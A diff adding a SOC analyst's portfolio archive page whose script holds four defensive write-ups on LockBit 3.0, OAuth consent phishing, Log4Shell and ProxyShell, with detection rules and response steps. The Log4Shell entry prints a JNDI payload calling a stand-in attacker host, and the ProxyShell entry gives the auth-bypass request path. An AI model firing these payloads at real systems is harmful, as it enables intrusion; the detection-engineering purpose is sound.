@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Research Archive | Swetha Devi — SOC Analyst</title>
+<meta name="description" content="Complete archive of threat research, attack deep-dives, detection rules and incident response playbooks by Swetha Devi.">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#030712;
+  --surface:#0c1120;
+  --surface2:#111827;
+  --accent:#00ffc6;
+  --accent2:#0ea5e9;
+  --red:#f43f5e;
+  --amber:#f59e0b;
+  --text:#f0f4ff;
+  --muted:#6b7280;
+  --border:rgba(255,255,255,0.07);
+  --font:'Space Grotesk',sans-serif;
+  --mono:'JetBrains Mono',monospace;
+}
+body{
+  font-family:var(--font);
+  background:var(--bg);
+  color:var(--text);
+  line-height:1.6;
+  overflow-x:hidden;
+}
+#bgCanvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.3;pointer-events:none}
+body::after{
+  content:'';position:fixed;inset:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px);
+  pointer-events:none;z-index:1;
+}
+nav{
+  position:fixed;top:0;left:0;right:0;z-index:900;
+  background:rgba(3,7,18,0.85);backdrop-filter:blur(20px);
+  border-bottom:1px solid var(--border);
+}
+.nav-inner{
+  max-width:1200px;margin:0 auto;padding:0 28px;
+  display:flex;align-items:center;justify-content:space-between;
+  height:64px;
+}
+.logo{display:flex;align-items:center;gap:12px;text-decoration:none}
+.logo-shield{
+  width:38px;height:38px;
+  background:linear-gradient(135deg,var(--accent),#0099aa);
+  border-radius:10px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:18px;color:#030712;
+}
+.logo-name{font-size:16px;font-weight:700;letter-spacing:-0.02em}
+.logo-tag{font-size:11px;color:var(--muted);font-family:var(--mono);margin-top:-2px}
+.nav-links{display:flex;gap:2px;list-style:none}
+.nav-links a{
+  color:var(--muted);text-decoration:none;
+  padding:8px 16px;border-radius:8px;
+  font-size:13px;font-weight:500;transition:.2s;
+}
+.nav-links a:hover{color:var(--accent);background:rgba(0,255,198,0.07)}
+.nav-links a.active{color:var(--accent)}
+.nav-cta{
+  background:var(--accent);color:#030712;
+  padding:8px 20px;border-radius:8px;
+  font-weight:600;font-size:13px;text-decoration:none;
+  transition:.2s;display:flex;align-items:center;gap:7px;
+}
+.nav-cta:hover{transform:translateY(-1px);box-shadow:0 8px 24px rgba(0,255,198,0.3)}
+.container{max-width:1200px;margin:0 auto;padding:0 28px;position:relative;z-index:2}
+.page-header{
+  padding-top:120px;
+  padding-bottom:40px;
+}
+.sec-tag{
+  font-family:var(--mono);font-size:12px;color:var(--accent);
+  text-transform:uppercase;letter-spacing:.1em;
+  margin-bottom:12px;
+}
+.page-title{
+  font-size:clamp(2rem,4vw,3rem);
+  font-weight:700;
+  letter-spacing:-0.03em;
+  background:linear-gradient(90deg,var(--text),var(--accent2));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.subhead{
+  color:var(--muted);
+  margin-top:12px;
+  font-size:1rem;
+  max-width:600px;
+}
+.blog-archive-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(340px,1fr));
+  gap:28px;
+  margin:40px 0 80px;
+}
+.blog-card{
+  background:var(--surface);
+  border:1px solid var(--border);
+  border-radius:20px;
+  padding:28px;
+  cursor:pointer;
+  transition:all .3s ease;
+  position:relative;
+  overflow:hidden;
+}
+.blog-card::before{
+  content:'';
+  position:absolute;
+  top:0;left:0;right:0;
+  height:2px;
+  background:linear-gradient(90deg,var(--accent),var(--accent2));
+  transform:scaleX(0);
+  transform-origin:left;
+  transition:transform .35s ease;
+}
+.blog-card:hover::before{transform:scaleX(1)}
+.blog-card:hover{
+  border-color:rgba(0,255,198,0.3);
+  transform:translateY(-6px);
+  background:var(--surface2);
+}
+.blog-cat{
+  display:inline-flex;
+  align-items:center;
+  gap:6px;
+  font-family:var(--mono);
+  font-size:10px;
+  text-transform:uppercase;
+  letter-spacing:.1em;
+  margin-bottom:16px;
+  color:var(--accent);
+  background:rgba(0,255,198,0.08);
+  padding:4px 12px;
+  border-radius:40px;
+  width:fit-content;
+}
+.blog-title{
+  font-size:1.2rem;
+  font-weight:700;
+  margin-bottom:12px;
+  line-height:1.4;
+}
+.blog-meta{
+  font-size:12px;
+  color:var(--muted);
+  font-family:var(--mono);
+  margin-bottom:14px;
+  display:flex;
+  align-items:center;
+  gap:12px;
+}
+.blog-excerpt{
+  font-size:13px;
+  color:var(--muted);
+  line-height:1.65;
+  margin-bottom:20px;
+}
+.blog-footer{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  margin-top:16px;
+  padding-top:16px;
+  border-top:1px solid var(--border);
+}
+.blog-read{
+  color:var(--accent);
+  font-size:13px;
+  font-weight:600;
+  display:inline-flex;
+  align-items:center;
+  gap:6px;
+  transition:.2s;
+}
+.blog-read:hover{gap:10px}
+.blog-tags{display:flex;gap:6px;flex-wrap:wrap}
+.blog-tag{
+  background:rgba(0,255,198,0.06);
+  border:1px solid rgba(0,255,198,0.12);
+  padding:2px 8px;
+  border-radius:4px;
+  font-size:9px;
+  font-family:var(--mono);
+  color:var(--accent);
+}
+.back-home{
+  display:inline-flex;
+  align-items:center;
+  gap:8px;
+  background:rgba(255,255,255,0.04);
+  border:1px solid var(--border);
+  padding:8px 20px;
+  border-radius:40px;
+  color:var(--text);
+  text-decoration:none;
+  font-size:13px;
+  transition:.2s;
+  margin-bottom:24px;
+}
+.back-home:hover{
+  border-color:var(--accent);
+  color:var(--accent);
+  transform:translateX(-4px);
+}
+footer{
+  border-top:1px solid var(--border);
+  padding:28px 0;
+  text-align:center;
+  font-family:var(--mono);
+  font-size:12px;
+  color:var(--muted);
+  position:relative;
+  z-index:2;
+}
+footer span{color:var(--accent)}
+
+/* MODAL (same as homepage) */
+.modal-overlay{
+  display:none;position:fixed;inset:0;
+  background:rgba(0,0,0,0.94);backdrop-filter:blur(20px);
+  z-index:1000;overflow-y:auto;
+  padding:40px 20px;
+}
+.modal-overlay.open{display:block}
+.modal-box{
+  max-width:860px;margin:0 auto;
+  background:#080e1c;border:1px solid rgba(0,255,198,0.2);
+  border-radius:24px;overflow:hidden;
+  animation:modal-in .3s ease;
+}
+@keyframes modal-in{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}
+.modal-top-bar{
+  background:#040a14;padding:16px 24px;
+  display:flex;align-items:center;justify-content:space-between;
+  border-bottom:1px solid var(--border);
+}
+.modal-title-row{display:flex;align-items:center;gap:12px}
+.modal-close{
+  background:none;border:none;color:var(--muted);
+  font-size:22px;cursor:pointer;padding:4px 8px;
+  transition:.2s;border-radius:6px;
+}
+.modal-close:hover{color:var(--text);background:rgba(255,255,255,0.06)}
+.modal-body{padding:36px}
+.modal-body h2{font-size:1.7rem;font-weight:700;margin-bottom:8px;letter-spacing:-0.02em}
+.modal-body h3{font-size:1.1rem;font-weight:600;color:var(--accent);margin:28px 0 10px;display:flex;align-items:center;gap:8px}
+.modal-body h3::before{content:'//';font-family:var(--mono);color:var(--muted);font-size:.9rem}
+.modal-body p{color:var(--muted);font-size:14px;line-height:1.8;margin-bottom:12px}
+.modal-body pre{
+  background:#020810;border:1px solid rgba(0,255,198,0.15);
+  border-left:3px solid var(--accent);
+  padding:20px;border-radius:12px;overflow-x:auto;
+  font-size:12px;font-family:var(--mono);line-height:1.7;
+  color:#a3e4d7;margin:16px 0;
+}
+.modal-body hr{border:none;border-top:1px solid var(--border);margin:28px 0}
+.modal-date{font-family:var(--mono);font-size:12px;color:var(--muted)}
+.mitre-grid{display:flex;flex-wrap:wrap;gap:8px;margin:12px 0}
+.mitre-tag{
+  background:rgba(244,63,94,0.07);border:1px solid rgba(244,63,94,0.2);
+  padding:4px 12px;border-radius:6px;font-family:var(--mono);font-size:11px;color:var(--red);
+}
+.reveal{opacity:0;transform:translateY(24px);transition:opacity .6s ease,transform .6s ease}
+.reveal.visible{opacity:1;transform:none}
+@media(max-width:768px){
+  .nav-links{display:none}
+  .blog-archive-grid{grid-template-columns:1fr}
+  .page-header{padding-top:100px}
+}
+</style>
+</head>
+<body>
+
+<canvas id="bgCanvas"></canvas>
+
+<nav>
+  <div class="nav-inner">
+    <a href="index.html" class="logo">
+      <div class="logo-shield"><i class="fas fa-shield-halved"></i></div>
+      <div>
+        <div class="logo-name">Swetha Devi</div>
+        <div class="logo-tag">SOC · Threat Hunting</div>
+      </div>
+    </a>
+    <ul class="nav-links">
+      <li><a href="index.html#about">About</a></li>
+      <li><a href="index.html#skills">Skills</a></li>
+      <li><a href="index.html#experience">Experience</a></li>
+      <li><a href="index.html#research">Research</a></li>
+      <li><a href="index.html#connect">Connect</a></li>
+    </ul>
+    <a href="mailto:swethadevi1125@gmail.com" class="nav-cta"><i class="fas fa-paper-plane"></i> Hire Me</a>
+  </div>
+</nav>
+
+<main class="container">
+  <div class="page-header reveal">
+    <a href="index.html" class="back-home"><i class="fas fa-arrow-left"></i> Back to Portfolio</a>
+    <div class="sec-tag"><i class="fas fa-archive"></i> // full archive</div>
+    <h1 class="page-title">Threat Research &<br>Attack Deep Dives</h1>
+    <p class="subhead">Complete collection of attack chain analysis, detection engineering, Sigma rules, KQL queries, and IR playbooks — all aligned with MITRE ATT&CK.</p>
+  </div>
+
+  <div class="blog-archive-grid" id="archiveGrid"></div>
+</main>
+
+<footer>
+  <div class="container">
+    <p>© 2025 <span>Swetha Devi Sai Priya Bonu</span> — SOC Analyst & Detection Engineer &nbsp;·&nbsp; <a href="index.html" style="color:var(--accent);text-decoration:none">Back to portfolio</a></p>
+  </div>
+</footer>
+
+<!-- MODAL STRUCTURE (same as homepage) -->
+<div class="modal-overlay" id="modal">
+  <div class="modal-box">
+    <div class="modal-top-bar">
+      <div class="modal-title-row">
+        <div style="width:10px;height:10px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent)"></div>
+        <span style="font-family:var(--mono);font-size:12px;color:var(--muted)">research/deep-dive</span>
+      </div>
+      <button class="modal-close" id="modalClose"><i class="fas fa-times"></i></button>
+    </div>
+    <div class="modal-body" id="modalBody"></div>
+  </div>
+</div>
+
+<script>
+// ==================== CANVAS BACKGROUND (particles) ====================
+const canvas = document.getElementById('bgCanvas');
+const ctx = canvas.getContext('2d');
+let W, H, particles = [];
+
+function resizeCanvas() {
+  W = canvas.width = window.innerWidth;
+  H = canvas.height = window.innerHeight;
+}
+resizeCanvas();
+window.addEventListener('resize', resizeCanvas);
+
+function randBetween(a, b) { return a + Math.random() * (b - a); }
+function initParticles() {
+  particles = [];
+  const count = Math.floor(W * H / 18000);
+  for (let i = 0; i < count; i++) {
+    particles.push({
+      x: Math.random() * W, y: Math.random() * H,
+      vx: randBetween(-0.18, 0.18), vy: randBetween(-0.12, 0.12),
+      r: randBetween(0.8, 2.2),
+      color: Math.random() > 0.6 ? 'rgba(0,255,198,' : 'rgba(14,165,233,',
+      alpha: randBetween(0.2, 0.7)
+    });
+  }
+}
+initParticles();
+
+function drawParticles() {
+  ctx.clearRect(0, 0, W, H);
+  particles.forEach(p => {
+    p.x += p.vx; p.y += p.vy;
+    if (p.x < 0) p.x = W; if (p.x > W) p.x = 0;
+    if (p.y < 0) p.y = H; if (p.y > H) p.y = 0;
+    ctx.beginPath();
+    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+    ctx.fillStyle = p.color + p.alpha + ')';
+    ctx.fill();
+  });
+  particles.forEach((p, i) => {
+    for (let j = i + 1; j < particles.length; j++) {
+      const q = particles[j];
+      const d = Math.hypot(p.x - q.x, p.y - q.y);
+      if (d < 110) {
+        ctx.beginPath();
+        ctx.moveTo(p.x, p.y);
+        ctx.lineTo(q.x, q.y);
+        ctx.strokeStyle = `rgba(0,255,198,${0.06 * (1 - d / 110)})`;
+        ctx.lineWidth = 0.5;
+        ctx.stroke();
+      }
+    }
+  });
+  requestAnimationFrame(drawParticles);
+}
+drawParticles();
+
+// ==================== FULL BLOGS DATABASE (identical to main portfolio but complete) ====================
+const allBlogs = [
+  {
+    id: 'lockbit',
+    cat: 'Ransomware',
+    title: 'LockBit 3.0: Complete Attack Chain',
+    date: 'March 2025',
+    excerpt: 'Double extortion tactics, defense evasion via Terminator driver, and Sigma rules to detect LockBit affiliates in enterprise environments.',
+    mitre: ['T1562.001', 'T1021.002', 'T1486', 'T1070', 'T1059'],
+    content: `
+      <h2>LockBit 3.0 Ransomware — Deep Dive</h2>
+      <p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;March 2025</p>
+      <hr>
+      <h3>Attack Chain</h3>
+      <p>Initial Access via RDP brute-force or phishing → Privilege Escalation using UAC bypass → Defense Evasion (Terminator driver kills EDR processes) → Lateral Movement via PsExec and WMI → Data Exfiltration using Mega/rclone → Encryption with .lockbit extension.</p>
+      <h3>MITRE ATT&CK Coverage</h3>
+      <div class="mitre-grid">
+        <span class="mitre-tag">T1562.001 — Disable/Modify Tools</span>
+        <span class="mitre-tag">T1021.002 — SMB/Admin Shares</span>
+        <span class="mitre-tag">T1486 — Data Encrypted for Impact</span>
+        <span class="mitre-tag">T1070 — Indicator Removal</span>
+        <span class="mitre-tag">T1059 — Command & Scripting Interpreter</span>
+      </div>
+      <h3>Methodology & TTPs</h3>
+      <p>Adversary leverages living-off-the-land binaries: certutil, BITSAdmin, mshta.exe. Disables Windows Defender, SIEM agents, and backup services. Drops Terminator.sys (BYOVD) to kill EDR kernel callbacks. Uses LOTL for C2 communication.</p>
+      <h3>Impact</h3>
+      <p>Critical data leakage, prolonged operational downtime, multi-million dollar ransom demands targeting healthcare, finance, and energy sectors globally.</p>
+      <h3>Incident Response Actions</h3>
+      <p>Immediate containment: isolate affected hosts, revoke compromised credentials. Restore from immutable backups offline. Block IOCs (C2 domains, driver hashes), hunt for LOLBin anomalies, check scheduled tasks and services.</p>
+      <h3>Detection Rules</h3>
+      <pre>// Sigma — Suspicious BITSAdmin Transfer
+title: BITSAdmin Unusual File Transfer
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: '\\\\bitsadmin.exe'
+    CommandLine|contains: '/transfer'
+  condition: selection
+level: high
+
+// KQL — LSASS Dump Detection
+DeviceProcessEvents
+| where ProcessCommandLine contains "comsvcs.dll"
+  and ProcessCommandLine contains "MiniDump"
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine
+
+// SPL — Terminator BYOVD Driver
+index=wineventlog EventCode=7045
+| eval svc=lower(ServiceName)
+| where svc="zamguard64" OR svc="zam64"</pre>
+    `
+  },
+  {
+    id: 'oauth',
+    cat: 'Cloud / Identity',
+    title: 'OAuth Consent Phishing (APT29 Style)',
+    date: 'February 2025',
+    excerpt: 'Abusing OAuth apps for token theft, MFA bypass via device code flow, detection queries, and incident response steps.',
+    mitre: ['T1550.001', 'T1111', 'T1114', 'T1098.003'],
+    content: `
+      <h2>OAuth Consent Phishing — APT29 Technique</h2>
+      <p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;February 2025</p>
+      <hr>
+      <h3>Attack Chain</h3>
+      <p>Spear-phishing link → rogue OAuth app consent granted by victim → access token + refresh token theft → persistent mailbox access → forwarding rules created → data exfiltrated from SharePoint/OneDrive.</p>
+      <h3>MITRE ATT&CK Coverage</h3>
+      <div class="mitre-grid">
+        <span class="mitre-tag">T1550.001 — Application Access Token</span>
+        <span class="mitre-tag">T1111 — MFA Interception</span>
+        <span class="mitre-tag">T1114.002 — Remote Email Collection</span>
+        <span class="mitre-tag">T1098.003 — Additional Cloud Credentials</span>
+      </div>
+      <h3>Methodology</h3>
+      <p>Threat actor uses device code flow phishing, mimicking legitimate Microsoft login. Bypasses MFA entirely by stealing already-authenticated refresh tokens. Registers persistent application in victim's Azure AD tenant.</p>
+      <h3>Impact</h3>
+      <p>Full cloud mailbox compromise, stealthy persistence without password reset, data exfiltration from SharePoint and OneDrive without triggering DLP policies.</p>
+      <h3>Response Actions</h3>
+      <p>Revoke all malicious OAuth grants via Entra portal. Enforce Conditional Access: block legacy auth, require compliant devices. Implement FIDO2 hardware keys. Audit enterprise application permissions quarterly.</p>
+      <h3>Detection Queries</h3>
+      <pre>// KQL — Unusual OAuth Consent (Sentinel/Defender)
+AADSignInEventsBeta
+| where ConsentProvidedForApp == true
+| where AppDisplayName !in (known_apps_allowlist)
+| where IPAddress !in (corporate_ips)
+| project Timestamp, UserPrincipalName, AppDisplayName, IPAddress, Location
+| order by Timestamp desc
+
+// KQL — Inbox Rule Created by Non-Owner
+OfficeActivity
+| where Operation == "New-InboxRule"
+| where UserId != MailboxOwnerUPN
+| project TimeGenerated, UserId, Parameters</pre>
+    `
+  },
+  {
+    id: 'log4shell',
+    cat: 'CVE / RCE',
+    title: 'Log4Shell (CVE-2021-44228) Methodology & IR',
+    date: 'January 2025',
+    excerpt: 'JNDI injection deep-dive, post-exploitation techniques, YARA rules, and a full containment playbook.',
+    mitre: ['T1190', 'T1059', 'T1105', 'T1071'],
+    content: `
+      <h2>Log4Shell — JNDI Injection & Full Exploitation Chain</h2>
+      <p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;January 2025</p>
+      <hr>
+      <h3>Attack Chain</h3>
+      <p>Adversary injects <code style="background:rgba(0,255,198,0.08);padding:2px 6px;border-radius:4px;font-family:var(--mono);font-size:12px">\${jndi:ldap://attacker.com/x}</code> into HTTP headers (User-Agent, X-Forwarded-For, X-Api-Version). Vulnerable log4j2 performs remote lookup → LDAP redirects to attacker RMI server → remote class loading → RCE on target JVM.</p>
+      <h3>MITRE ATT&CK Coverage</h3>
+      <div class="mitre-grid">
+        <span class="mitre-tag">T1190 — Exploit Public-Facing Application</span>
+        <span class="mitre-tag">T1059.007 — JavaScript/JScript</span>
+        <span class="mitre-tag">T1105 — Ingress Tool Transfer</span>
+        <span class="mitre-tag">T1071 — Application Layer Protocol</span>
+      </div>
+      <h3>Post-Exploitation</h3>
+      <p>Crypto miner deployment, reverse shell via Netcat/Cobalt Strike beacon, pivoting to internal cloud metadata service, credential harvesting from JVM heap dumps.</p>
+      <h3>Response Actions</h3>
+      <p>Patch to log4j2 ≥2.17.1 immediately. Interim: set -Dlog4j2.formatMsgNoLookups=true. Remove JndiLookup.class from jar files. Deploy WAF rule blocking \${jndi: patterns. Hunt for DNS callouts to unknown LDAP/RMI endpoints.</p>
+      <h3>Detection Rules</h3>
+      <pre># YARA — Log4Shell Exploitation Attempt
+rule Log4j_JNDI_Exploit {
+  meta:
+    description = "Detects Log4Shell exploitation in HTTP logs"
+    severity = "CRITICAL"
+  strings:
+    $a = /\\$\\{jndi:(ldap|rmi|dns|iiop|corba|nds):\\/\\// nocase
+    $b = "\\$\\{lower:" nocase
+    $c = "\\$\\{upper:" nocase
+  condition:
+    $a or ($b and $c)
+}</pre>
+    `
+  },
+  {
+    id: 'proxyshell',
+    cat: 'Exchange / RCE',
+    title: 'ProxyShell: Exchange Pre-Auth RCE Chain',
+    date: 'December 2024',
+    excerpt: 'SSRF to PowerShell remoting to webshell deployment — detection rules and hardening for Microsoft Exchange.',
+    mitre: ['T1190', 'T1059.001', 'T1505.003', 'T1021.006'],
+    content: `
+      <h2>ProxyShell — Microsoft Exchange RCE Chain</h2>
+      <p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;December 2024</p>
+      <hr>
+      <h3>CVE Chain</h3>
+      <p>CVE-2021-34473 (SSRF / auth bypass) → CVE-2021-34523 (PowerShell remoting privilege escalation) → CVE-2021-31207 (write arbitrary webshell via mailbox export).</p>
+      <h3>MITRE ATT&CK Coverage</h3>
+      <div class="mitre-grid">
+        <span class="mitre-tag">T1190 — Exploit Public-Facing App</span>
+        <span class="mitre-tag">T1059.001 — PowerShell</span>
+        <span class="mitre-tag">T1505.003 — Web Shell</span>
+        <span class="mitre-tag">T1021.006 — WinRM</span>
+      </div>
+      <h3>Methodology</h3>
+      <p>Attacker sends malicious POST to /autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json%3F@victim.com to bypass auth. Then uses Exchange Management PowerShell to schedule mailbox export to .aspx path, deploying a webshell in /aspnet_client/.</p>
+      <h3>Impact</h3>
+      <p>Full Exchange server compromise, persistent webshell access, mailbox data theft, lateral movement to domain controllers. Widely exploited by ransomware groups and nation-state actors.</p>
+      <h3>Response Actions</h3>
+      <p>Apply Exchange CU immediately. Remove .asp/.aspx/.ashx files from /aspnet_client/ and /OWA/ directories. Reset IIS app pools. Revoke all PendingRequests in EMS. Audit New-MailboxExportRequest logs.</p>
+      <h3>Detection Rules</h3>
+      <pre>// Sigma — ProxyShell Autodiscover Abuse
+title: ProxyShell Exploitation Attempt
+logsource:
+  product: iis
+detection:
+  selection:
+    cs-method: POST
+    cs-uri-stem|contains:
+      - '/autodiscover/autodiscover.json'
+      - '/autodiscover/autodiscover.xml'
+    cs-uri-query|contains: '@'
+  condition: selection
+level: critical
+
+// KQL — Mailbox Export to Webshell Path
+SecurityEvent
+| where EventID == 4104
+| where ScriptBlockText contains "New-MailboxExportRequest"
+  and ScriptBlockText contains "aspnet_client"
+| project TimeGenerated, Computer, SubjectUserName, ScriptBlockText</pre>
+    `
+  }
+];
+
+// ==================== RENDER ALL BLOGS IN ARCHIVE GRID ====================
+function buildArchive() {
+  const grid = document.getElementById('archiveGrid');
+  if (!grid) return;
+  grid.innerHTML = '';
+  allBlogs.forEach((blog, idx) => {
+    const card = document.createElement('div');
+    card.className = 'blog-card reveal';
+    card.style.transitionDelay = `${idx * 0.05}s`;
+    card.innerHTML = `
+      <div class="blog-cat"><i class="fas fa-bug" style="font-size:11px"></i> ${blog.cat}</div>
+      <div class="blog-title">${blog.title}</div>
+      <div class="blog-meta"><i class="far fa-calendar-alt"></i> ${blog.date} &nbsp;|&nbsp; <i class="fas fa-tag"></i> ${blog.mitre.length} techniques</div>
+      <div class="blog-excerpt">${blog.excerpt}</div>
+      <div class="blog-footer">
+        <span class="blog-read">Read full analysis <i class="fas fa-arrow-right"></i></span>
+        <div class="blog-tags">${blog.mitre.slice(0, 3).map(m => `<span class="blog-tag">${m}</span>`).join('')}${blog.mitre.length > 3 ? '<span class="blog-tag">+more</span>' : ''}</div>
+      </div>
+    `;
+    card.addEventListener('click', () => openModal(blog));
+    grid.appendChild(card);
+  });
+}
+buildArchive();
+
+// ==================== MODAL LOGIC (identical to homepage) ====================
+const modal = document.getElementById('modal');
+const modalBody = document.getElementById('modalBody');
+const modalClose = document.getElementById('modalClose');
+
+function openModal(blog) {
+  modalBody.innerHTML = blog.content;
+  modal.classList.add('open');
+  document.body.style.overflow = 'hidden';
+}
+
+function closeModal() {
+  modal.classList.remove('open');
+  document.body.style.overflow = '';
+}
+
+modalClose.addEventListener('click', closeModal);
+modal.addEventListener('click', (e) => {
+  if (e.target === modal) closeModal();
+});
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape' && modal.classList.contains('open')) closeModal();
+});
+
+// ==================== SCROLL REVEAL ====================
+const revealObserver = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+      revealObserver.unobserve(entry.target);
+    }
+  });
+}, { threshold: 0.1 });
+
+document.querySelectorAll('.reveal').forEach(el => revealObserver.observe(el));
+
+// force reveal for header
+setTimeout(() => {
+  document.querySelectorAll('.reveal').forEach(el => {
+    if (el.getBoundingClientRect().top < window.innerHeight - 100) el.classList.add('visible');
+  });
+}, 200);
+</script>
+</body>
+</html>
